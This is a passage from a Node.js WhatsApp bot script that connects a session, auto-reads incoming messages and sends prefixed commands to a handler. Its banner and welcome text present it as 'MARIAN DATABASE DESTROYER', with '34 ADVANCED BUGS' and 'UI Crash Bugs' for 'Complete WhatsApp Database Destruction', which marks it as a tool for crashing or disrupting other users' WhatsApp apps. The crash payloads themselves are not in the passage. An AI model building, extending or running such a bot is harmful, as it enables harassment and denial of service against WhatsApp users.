                           `⚡ Prefix: ${CONFIG.PREFIX}\n` +
                           `🔴 Database Bugs: 18 ACTIVE\n` +
                           `🟠 Thermal Bugs: 5 ACTIVE\n` +
                           `🟡 UI Crash Bugs: 6 ACTIVE\n` +
                           `🟢 Business Bugs: 5 ACTIVE\n` +
                           `🎨 Sticker Maker: WORKING\n\n` +
                           `Type ${CONFIG.PREFIX}menu for all commands\n` +
                           `_System: Complete WhatsApp Database Destruction_`
            
            if (sock.user?.id) {
                sock.sendMessage(sock.user.id, { text: welcome })
            }
        }
    })
    
    sock.ev.on('messages.upsert', async ({ messages }) => {
        try {
            const m = messages[0]
            if (!m.message || m.key.fromMe) return
            
            const from = m.key.remoteJid
            const type = getContentType(m.message)
            
            // Auto read
            await sock.readMessages([m.key])
            
            // Get message body
            let body = ''
            if (type === 'conversation') {
                body = m.message.conversation
            } else if (type === 'extendedTextMessage') {
                body = m.message.extendedTextMessage.text
            }
            
            // Get quoted message
            const quoted = m.message[type]?.contextInfo?.quotedMessage || null
            
            // Handle command
            if (body && body.startsWith(CONFIG.PREFIX)) {
                await handler.handle(from, body, quoted)
            }
            
        } catch (error) {
            log('ERROR', `Message handling error: ${error.message}`)
        }
    })
}

// ==================== [ STARTUP ] ====================
console.clear()
console.log(chalk.bgRed.black('\n ☠️ MARIAN DATABASE DESTROYER v13.0 - ULTIMATE BUG SYSTEMS ☠️ \n'))
console.log(chalk.yellow('🔥 34 ADVANCED BUGS | AUTO LOGIN | DATABASE DESTRUCTION 🔥\n'))

// Handle errors
process.on('uncaughtException', (error) => {
    log('ERROR', `Uncaught exception: ${error.message}`)
})

process.on('unhandledRejection', (reason) => {
    log('ERROR', `Unhandled rejection: ${reason}`)
})

// Start bot
startBot().catch(error => {
    log('ERROR', `Startup failed: ${error.message}`)
    log('SYSTEM', 'Restarting in 5 seconds...')
    setTimeout(startBot, 5000)
})
